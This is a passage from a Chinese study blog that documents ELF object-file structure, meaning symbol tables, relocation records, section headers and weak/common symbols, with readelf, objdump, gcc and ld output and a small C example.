class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>    <span class="number">79</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> swap</span><br></pre></td></tr></table></figure>

<h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> Elf64_Sxword</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>

<h3 id="本程序实例"><a href="#本程序实例" class="headerlink" title="本程序实例"></a>本程序实例</h3><blockquote>
<p>可以用工具需要重定位的位置，这里有个问题，就是值都是地址减4感觉是个问题，call的话明明需要减去下一条指令的地址才对，有机会研究一下。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++<span class="meta"># objdump -r a.o</span></span><br><span class="line"></span><br><span class="line">a.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.text]:</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line"><span class="number">000000000000001</span>a R_X86_64_PC32     shared<span class="number">-0x0000000000000004</span></span><br><span class="line"><span class="number">000000000000002</span>a R_X86_64_PLT32    swap<span class="number">-0x0000000000000004</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.eh_frame]:</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line"><span class="number">0000000000000020</span> R_X86_64_PC32     .text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@L:/home/l/c++<span class="meta"># objdump -d a.o</span></span><br><span class="line"></span><br><span class="line">a.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;main&gt;:</span><br><span class="line">   <span class="number">0</span>:   f3 <span class="number">0f</span> <span class="number">1</span>e fa             endbr64 </span><br><span class="line">   <span class="number">4</span>:   <span class="number">55</span>                      push   %rbp</span><br><span class="line">   <span class="number">5</span>:   <span class="number">48</span> <span class="number">89</span> e5                mov    %rsp,%rbp</span><br><span class="line">   <span class="number">8</span>:   <span class="number">48</span> <span class="number">83</span> ec <span class="number">10</span>             sub    $<span class="number">0x10</span>,%rsp</span><br><span class="line">   c:   c7 <span class="number">45</span> fc <span class="number">64</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x64</span>,<span class="number">-0x4</span>(%rbp)</span><br><span class="line">  <span class="number">13</span>:   <span class="number">48</span> <span class="number">8</span>d <span class="number">45</span> fc             lea    <span class="number">-0x4</span>(%rbp),%rax</span><br><span class="line">  <span class="number">17</span>:   <span class="number">48</span> <span class="number">8</span>d <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    lea    <span class="number">0x0</span>(%rip),%rdx        # <span class="number">1</span>e &lt;main+<span class="number">0x1e</span>&gt;</span><br><span class="line">  <span class="number">1</span>e:   <span class="number">48</span> <span class="number">89</span> d6                mov    %rdx,%rsi</span><br><span class="line">  <span class="number">21</span>:   <span class="number">48</span> <span class="number">89</span> c7                mov    %rax,%rdi</span><br><span class="line">  <span class="number">24</span>:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">29</span>:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">2</span>e &lt;main+<span class="number">0x2e</span>&gt;</span><br><span class="line">  <span class="number">2</span>e:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">33</span>:   c9                      leave  </span><br><span class="line">  <span class="number">34</span>:   c3                      ret    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">接下来分析一下hex的存储。</span></span><br><span class="line"><span class="comment">可以观察到偏移和append都是正确的（注意小端序）</span></span><br><span class="line"><span class="comment">具体字段ffffff fffffffffc应该是-4，到时候怎么用还得看下面</span></span><br><span class="line"><span class="comment">00000003 00000002 根据符号表的位置知道高三十二位代表索引，低32位则代表类型，盲猜类型应该根怎么重定位有关系</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -x 2 a.o</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.rela.text&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000000</span> <span class="number">1</span>a000000 <span class="number">00000000</span> <span class="number">02000000</span> <span class="number">03000000</span> ................</span><br><span class="line">  <span class="number">0x00000010</span> fcffffff ffffffff <span class="number">2</span>a000000 <span class="number">00000000</span> ........*.......</span><br><span class="line">  <span class="number">0x00000020</span> <span class="number">04000000</span> <span class="number">05000000</span> fcffffff ffffffff ................</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>到了这里大概已经了解了汇编到链接的粗浅的过程，虽然没有看过源码的实现，但是也粗浅猜测一下，最重要的就是节表和elf头表，这两个表看起来可以定位elf中的所有元素，节中元素只需要考虑对节的相对偏移即可，接下来的每一步操作只要维护节表和头表即可，看到这里感觉字符串表完全是可以省略的东西，但是一想链接需要名字来识别，但是可执行文件估计就可以少了好多东西。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*可以看到是有字符串表的*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -S ab</span></span><br><span class="line">There are <span class="number">9</span> section headers, starting at offset <span class="number">0x3188</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>             <span class="number">0000000000000000</span>  <span class="number">00000000</span></span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .note.gnu.pr[...] NOTE             <span class="number">00000000004001</span>c8  <span class="number">000001</span>c8</span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">2</span>] .text             PROGBITS         <span class="number">0000000000401000</span>  <span class="number">00001000</span></span><br><span class="line">       <span class="number">0000000000000084</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">3</span>] .eh_frame         PROGBITS         <span class="number">0000000000402000</span>  <span class="number">00002000</span></span><br><span class="line">       <span class="number">0000000000000058</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">4</span>] .data             PROGBITS         <span class="number">0000000000404000</span>  <span class="number">00003000</span></span><br><span class="line">       <span class="number">0000000000000004</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .comment          PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00003004</span></span><br><span class="line">       <span class="number">000000000000002b</span>  <span class="number">0000000000000001</span>  MS       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .symtab           SYMTAB           <span class="number">0000000000000000</span>  <span class="number">00003030</span></span><br><span class="line">       <span class="number">00000000000000</span>d8  <span class="number">0000000000000018</span>           <span class="number">7</span>     <span class="number">3</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">7</span>] .strtab           STRTAB           <span class="number">0000000000000000</span>  <span class="number">00003108</span></span><br><span class="line">       <span class="number">0000000000000032</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">8</span>] .shstrtab         STRTAB           <span class="number">0000000000000000</span>  <span class="number">0000313</span>a</span><br><span class="line">       <span class="number">000000000000004</span>d  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br><span class="line"> <span class="comment">/*可以看到是有指令可以移除字符串表的，哎，安全行业堪忧*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># ld a.o b.o -e main -o ab -s</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -S ab</span></span><br><span class="line">There are <span class="number">7</span> section headers, starting at offset <span class="number">0x3070</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>             <span class="number">0000000000000000</span>  <span class="number">00000000</span></span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .note.gnu.pr[...] NOTE             <span class="number">00000000004001</span>c8  <span class="number">000001</span>c8</span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">2</span>] .text             PROGBITS         <span class="number">0000000000401000</span>  <span class="number">00001000</span></span><br><span class="line">       <span class="number">0000000000000084</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">3</span>] .eh_frame         PROGBITS         <span class="number">0000000000402000</span>  <span class="number">00002000</span></span><br><span class="line">       <span class="number">0000000000000058</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">4</span>] .data             PROGBITS         <span class="number">0000000000404000</span>  <span class="number">00003000</span></span><br><span class="line">       <span class="number">0000000000000004</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .comment          PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00003004</span></span><br><span class="line">       <span class="number">000000000000002b</span>  <span class="number">0000000000000001</span>  MS       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .shstrtab         STRTAB           <span class="number">0000000000000000</span>  <span class="number">0000302f</span></span><br><span class="line">       <span class="number">000000000000003</span>d  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>

<h2 id="关于common"><a href="#关于common" class="headerlink" title="关于common"></a>关于common</h2><blockquote>
<p>书中也讲了弱符号同名该如何处理，将了一种common块的知识，但是目前gcc貌似弃用了这玩意，直接在bind中表明这东西是弱符号。</p>
<p>fcommon选项都不起作用了</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> ext;</span><br><span class="line"><span class="type">int</span> weak;</span><br><span class="line"><span class="type">int</span> strong = <span class="number">1</span>;</span><br><span class="line">__attribute__((weak)) <span class="type">int</span> weak2 = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> week2 = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,week2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">root@L:/home/l/c++<span class="meta"># gcc  -nostdlib -fno-exceptions -fno-unwind-tables -fno-stack-protector -fcommon -c a.c -o a.o</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s a.o</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">10</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">5</span> .rodata</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000000004</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT  COM weak</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">3</span> strong</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000000004</span>     <span class="number">4</span> OBJECT  WEAK   DEFAULT    <span class="number">3</span> weak2</span><br><span class="line">     <span class="number">7</span>: <span class="number">0000000000000008</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">3</span> week2</span><br><span class="line">     <span class="number">8</span>: <span class="number">0000000000000000</span>    <span class="number">43</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> main</span><br><span class="line">     <span class="number">9</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">printf</span></span><br></pre></td></tr></table></figure>

<h1 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h1><h2 id="重复代码消除"><a href="#重复代码消除" class="headerlink" title="重复代码消除"></a><strong>重复代码消除</strong></h2><blockquote>
<p>非常高视角的讨论一下，有个印象</p>
</blockquote>
<p>c++的模板的实现，函数级别的链接，都涉及到代码的消除，否则会产生重定义的问题。具体的方法有，将不同函数放在不同的段，相同函数放在相同的段，链接的时候只保留一个。至于函数级别的链接，则涉及到无用函数的消除，但是会加大链接和汇编的成本。</p>
<h2 id="c-与ABI"><a href="#c-与ABI" class="headerlink" title="c++与ABI"></a><strong>c++与ABI</strong></h2><p>一句话来说是api是为了源码级别的兼容，在提供相应接口的os上，接口的行为是一样的。如posix标准，规定了一些列操作系统应该提供怎么样的接口的标准。而c库开发者若使用这些接口就很容易在不同的os上移植这些库。（粗显介绍）</p>
<p>至于ABI，则是应用二进制接口，就是不同的平台的二进制文件可以相互移植，基本上就是你windows的操作系统也可以处理linux的elf文件，看到这里，还是有点可能，毕竟这种文件格式的定义都是在c库中的实现，但是就算是文件结构可以合并到一起，又如何在一个机器上同时执行2种汇编代码呢？虚拟机吗？但是这不是兼容两种型号，是兼容多种型号，该如何实现？不知道了。</p>
]]></content>
      <categories>
        <category>读书笔记</category>
        <category>程序员的自我修养，链接装载与库</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
        <tag>程序员的自我修养，链接装载与库</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF初探</title>
    <url>/2024/08/15/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E9%93%BE%E6%8E%A5%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/ELF%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h1 id="程序示例"><a href="#程序示例" class="headerlink" title="程序示例"></a>程序示例</h1><blockquote>
<p>参照多方资料做个总结,用下方程序</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc -c 文件名.c，生成可重定位文件，生成的为可重定位文件，不要直接生成可执行文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_init_var = <span class="number">84</span>;</span><br><span class="line"><span class="type">int</span> global_uninit_var;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var = <span class="number">85</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var2;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    func1(static_var + static_var2 + a + b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="elf-header"><a href="#elf-header" class="headerlink" title="elf header"></a>elf header</h1><blockquote>
<p>初次学习主要关注 Start of section headers即可，初次旨在弄清楚文件结构</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">其中指出了节表的开始地址，也指出了节表中元素数量</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -h ./elfdemo.o</span></span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   <span class="number">7f</span> <span class="number">45</span> <span class="number">4</span>c <span class="number">46</span> <span class="number">02</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              <span class="number">2&#x27;</span>s complement, little endian</span><br><span class="line">  Version:                           <span class="number">1</span> (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       <span class="number">0</span></span><br><span class="line">  Type:                              REL (Relocatable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86<span class="number">-64</span></span><br><span class="line">  Version:                           <span class="number">0x1</span></span><br><span class="line">  Entry point address:               <span class="number">0x0</span></span><br><span class="line">  Start of program headers:          <span class="number">0</span> (bytes into file)</span><br><span class="line">  Start of section headers:          <span class="number">1040</span> (bytes into file)</span><br><span class="line">  Flags:                             <span class="number">0x0</span></span><br><span class="line">  Size of this header:               <span class="number">64</span> (bytes)</span><br><span class="line">  Size of program headers:           <span class="number">0</span> (bytes)</span><br><span class="line">  Number of program headers:         <span class="number">0</span></span><br><span class="line">  Size of section headers:           <span class="number">64</span> (bytes)</span><br><span class="line">  Number of section headers:         <span class="number">14</span></span><br><span class="line">  Section header <span class="built_in">string</span> table index: <span class="number">13</span><span class="comment">/*字符串表的节索引*/</span></span><br></pre></td></tr></table></figure>

<h1 id="section-header（节描述符）"><a href="#section-header（节描述符）" class="headerlink" title="section header（节描述符）"></a>section header（节描述符）</h1><blockquote>
<p>按照本人的理解为section和segment的区别是一个是在文件中，一个是在runtime，本次学习所用实例为可重定向文件，非文件，因此没有program header。</p>
<p>其详细的描述了每一个节的信息。</p>
</blockquote>
<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	sh_name;		<span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf64_Word	sh_type;		<span class="comment">/* Section type */</span><span class="comment">/*段的类型（用处）*/</span></span><br><span class="line">  Elf64_Xword	sh_flags;		<span class="comment">/* Section flags */</span><span class="comment">/*标志位*/</span></span><br><span class="line">  Elf64_Addr	sh_addr;		<span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf64_Off	sh_offset;		<span class="comment">/* Section file offset */</span><span class="comment">/*文件偏移地址*/</span></span><br><span class="line">  Elf64_Xword	sh_size;		<span class="comment">/* Section size in bytes */</span><span class="comment">/*节长*/</span></span><br><span class="line">  Elf64_Word	sh_link;		<span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf64_Word	sh_info;		<span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf64_Xword	sh_addralign;		<span class="comment">/* Section alignment */</span><span class="comment">/*对齐，若为8，则起始地址除8=0*/</span></span><br><span class="line">  Elf64_Xword	sh_entsize;		<span class="comment">/* Entry size if section holds table */</span><span class="comment">/*项长度，符号表24*/</span></span><br><span class="line">&#125; Elf64_Shdr;</span><br><span class="line"></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -S ./elfdemo.o</span></span><br><span class="line">There are <span class="number">14</span> section headers, starting at offset <span class="number">0x410</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>             <span class="number">0000000000000000</span>  <span class="number">00000000</span></span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00000040</span></span><br><span class="line">       <span class="number">0000000000000062</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .rela.text        RELA             <span class="number">0000000000000000</span>  <span class="number">000002f</span>0</span><br><span class="line">       <span class="number">0000000000000078</span>  <span class="number">0000000000000018</span>   I      <span class="number">11</span>     <span class="number">1</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">3</span>] .data             PROGBITS         <span class="number">0000000000000000</span>  <span class="number">000000</span>a4</span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .bss              NOBITS           <span class="number">0000000000000000</span>  <span class="number">000000</span>ac</span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .rodata           PROGBITS         <span class="number">0000000000000000</span>  <span class="number">000000</span>ac</span><br><span class="line">       <span class="number">0000000000000004</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .comment          PROGBITS         <span class="number">0000000000000000</span>  <span class="number">000000b</span>0</span><br><span class="line">       <span class="number">000000000000002</span>c  <span class="number">0000000000000001</span>  MS       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">7</span>] .note.GNU-<span class="built_in">stack</span>   PROGBITS         <span class="number">0000000000000000</span>  <span class="number">000000</span>dc</span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">8</span>] .note.gnu.pr[...] NOTE             <span class="number">0000000000000000</span>  <span class="number">000000e0</span></span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">9</span>] .eh_frame         PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00000100</span></span><br><span class="line">       <span class="number">0000000000000058</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">10</span>] .rela.eh_frame    RELA             <span class="number">0000000000000000</span>  <span class="number">00000368</span></span><br><span class="line">       <span class="number">0000000000000030</span>  <span class="number">0000000000000018</span>   I      <span class="number">11</span>     <span class="number">9</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">11</span>] .symtab           SYMTAB           <span class="number">0000000000000000</span>  <span class="number">00000158</span></span><br><span class="line">       <span class="number">0000000000000138</span>  <span class="number">0000000000000018</span>          <span class="number">12</span>     <span class="number">8</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">12</span>] .strtab           STRTAB           <span class="number">0000000000000000</span>  <span class="number">00000290</span></span><br><span class="line">       <span class="number">000000000000005</span>a  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [<span class="number">13</span>] .shstrtab         STRTAB           <span class="number">0000000000000000</span>  <span class="number">00000398</span></span><br><span class="line">       <span class="number">0000000000000074</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>

<h2 id="Symbol-table（重要节之一）"><a href="#Symbol-table（重要节之一）" class="headerlink" title="Symbol table（重要节之一）"></a>Symbol table（重要节之一）</h2><h3 id="其中元素结构为："><a href="#其中元素结构为：" class="headerlink" title="其中元素结构为："></a>其中元素结构为：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.Symbol name,为符号名所在位置的index，而符号名在字符串表中，会在下面介绍</span></span><br><span class="line"><span class="comment">2.st_info：符号类型和绑定，</span></span><br><span class="line"><span class="comment">	符号绑定（binding）：表示符号的作用域和链接属性，例如是局部符号还是全局符号，还有弱符号。</span></span><br><span class="line"><span class="comment">	符号类型（type）：表示符号的类型，例如它是一个函数、变量还是某种特殊的符号。</span></span><br><span class="line"><span class="comment">3.st_other，符号可见性，可由符号绑定决定，也可以自定义，决定了是否能被外部引用。	</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> Elf64_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint16_t</span> Elf64_Section;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line">一个结构体占：<span class="number">4</span>+<span class="number">2</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">8</span>+<span class="number">8</span>=<span class="number">24b</span>ytes</span><br><span class="line"></span><br></pre></td></tr></table></figure>

